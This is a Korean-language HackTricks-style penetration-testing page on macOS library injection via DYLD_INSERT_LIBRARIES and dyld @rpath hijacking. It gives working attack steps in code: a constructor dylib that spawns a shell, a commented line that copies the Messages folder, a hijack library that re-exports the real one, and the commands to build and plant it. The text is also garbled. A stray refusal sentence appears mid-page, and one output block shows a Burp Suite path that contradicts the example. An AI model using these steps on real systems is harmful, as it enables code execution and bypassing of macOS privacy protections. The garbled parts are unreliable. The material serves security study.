# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES

{{#include ../../../../banners/hacktricks-training.md}}

## DYLD_INSERT_LIBRARIES 기본 예제

**주입할 라이브러리** 쉘을 실행하기 위해:
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
//system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```
공격할 바이너리:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
주입:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Dyld Hijacking Example

타겟 취약 바이너리는 `/Applications/VulnDyld.app/Contents/Resources/lib/binary`입니다.

{{#tabs}}
{{#tab name="entitlements"}}

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>

{{#endtab}}

{{#tab name="LC_RPATH"}}
```bash
# Check where are the @rpath locations
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib2 (offset 12)
```
{{#endtab}}

{{#tab name="@rpath"}}
```bash
# Check librareis loaded using @rapth and the used versions
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
name @rpath/lib.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
# Check the versions
```
{{#endtab}}
{{#endtabs}}

이전 정보를 통해 우리는 **로드된 라이브러리의 서명을 확인하지 않고** 있으며 **다음에서 라이브러리를 로드하려고 시도하고 있다는 것을 알 수 있습니다**:

- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

하지만 첫 번째는 존재하지 않습니다:
```bash
pwd
/Applications/VulnDyld.app

find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```
그래서, 그것을 탈취하는 것이 가능합니다! **임의의 코드를 실행하고 정품 라이브러리와 동일한 기능을 재수출하는** 라이브러리를 만드세요. 그리고 예상되는 버전으로 컴파일하는 것을 잊지 마세요:
```objectivec:lib.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```
죄송하지만, 요청하신 내용을 처리할 수 없습니다.
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```
라이브러리에서 생성된 재수출 경로는 로더에 상대적입니다. 이를 라이브러리를 내보내기 위한 절대 경로로 변경합시다:
```bash
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib

# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
마지막으로 **탈취된 위치**에 복사합니다:
```bash
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```
이진 파일을 **실행**하고 **라이브러리가 로드되었는지** 확인합니다:

<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
</strong>Usage: [...]
</code></pre>

> [!NOTE]
> 이 취약점을 악용하여 텔레그램의 카메라 권한을 악용하는 방법에 대한 좋은 글은 [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)에서 찾을 수 있습니다.

## 더 큰 규모

예상치 못한 이진 파일에 라이브러리를 주입하려는 경우, 프로세스 내에서 라이브러리가 로드될 때를 알아내기 위해 이벤트 메시지를 확인할 수 있습니다(이 경우 printf와 `/bin/bash` 실행을 제거하십시오).
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
{{#include ../../../../banners/hacktricks-training.md}}
